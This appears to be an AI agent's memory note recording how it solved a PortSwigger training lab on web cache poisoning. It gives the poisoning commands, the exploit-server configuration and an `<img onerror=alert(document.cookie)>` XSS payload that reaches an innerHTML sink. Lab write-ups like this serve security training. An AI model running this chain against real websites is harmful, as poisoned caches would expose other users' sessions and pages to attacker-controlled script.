---
metadata:
  node_type: memory
name: "PortSwigger Web Cache Poisoning DOM Vuln strict cacheability"
description: "Lab solved: X-Forwarded-Host reflected into data.host; origin only cacheable with a session cookie; poisoned / with an exploit-server JSON payload reaching the innerHTML sink"
last_updated: 2026-10-10T17:01:41+08:00
created: 2026-10-10T17:01:41+08:00
---

## 2026-02 (arm A) lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

Target: PortSwigger lab, instance 0a3500c503c3f7ff8251ecda00700050.web-security-academy.net (range_launch launch-url, jar /tmp/cj1.json).

Mechanism found by live recon:
- Home page injects `data = {"host":"<reflected>","path":"/"}` and calls `initGeoLocate('//' + data.host + '/resources/json/geolocate.json')`.
- `data.host` reflects the `X-Forwarded-Host` header, so it is unkeyed input; the DOM sink in geolocate.js is `div.innerHTML = 'Free shipping to ' + j.country`, so pointing the fetch cross-origin turns the JSON country field into an HTML/JS sink.
- The strict cacheability criterion: a cookie-less request gets `Set-Cookie: session=...` plus `Cache-Control: no-cache` and never enters the cache; with a valid session cookie the origin returns `Cache-Control: max-age=30` and the response is cached. So the poison request must carry a session cookie and must land on an expired entry.
- `/?cb=` requests are uncacheable, which is handy for harvesting a session cookie into a jar without polluting the entry.

Chain that solved it:
1. Exploit server STORE: responseFile=/resources/json/geolocate.json, responseHead `HTTP/1.1 200 OK` + `Content-Type: application/json` + `Access-Control-Allow-Origin: *` (CORS is required, the DOM fetch is cross-origin), responseBody `{"country":"<img src=1 onerror=alert(document.cookie)>"}`.
2. Harvest session via `http_session get /?cb=sess1 --jar`.
3. `poison_loop / --header 'X-Forwarded-Host: exploit-....exploit-server.net' --interval-secs 2 --count 25 --jar` (about 50s covers at least one 30s expiry).
4. Verify: plain `GET /` returned x-cache hit, max-age=30, `data.host` = exploit server host; `banner_verdict` -> solved:true, "Congratulations, you solved the lab!".

Tooling notes: cache_probe spec format is `{"requests":[...]}` and it adds `Pragma: x-get-cache-key`. http_dump/cache_probe without --jar drop Set-Cookie, so a session must be captured with --jar. poison_loop prints only statuses; cache state has to be verified separately.

